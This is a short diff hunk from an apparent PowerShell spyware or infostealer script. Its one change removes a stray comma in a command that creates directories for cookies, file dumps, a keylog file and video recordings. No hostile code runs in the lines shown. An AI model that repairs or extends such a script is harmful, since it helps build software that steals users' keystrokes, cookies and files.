@@ -9,7 +9,7 @@ $logPath = "$tempDir\log.json"
 $keylogPath = "$tempDir\keylog.txt"
 $recordingDir = "$env:USERPROFILE\luna_video_fragments"
 
-New-Item -ItemType Directory -Force -Path $tempDir, $cookieDir, $fileDumpDir, $recordingDir, $videoSubDir, | Out-Null
+New-Item -ItemType Directory -Force -Path $tempDir, $cookieDir, $fileDumpDir, $recordingDir, $videoSubDir | Out-Null
 
 
 Start-Transcript -Path "$tempDir\session.log" -Append
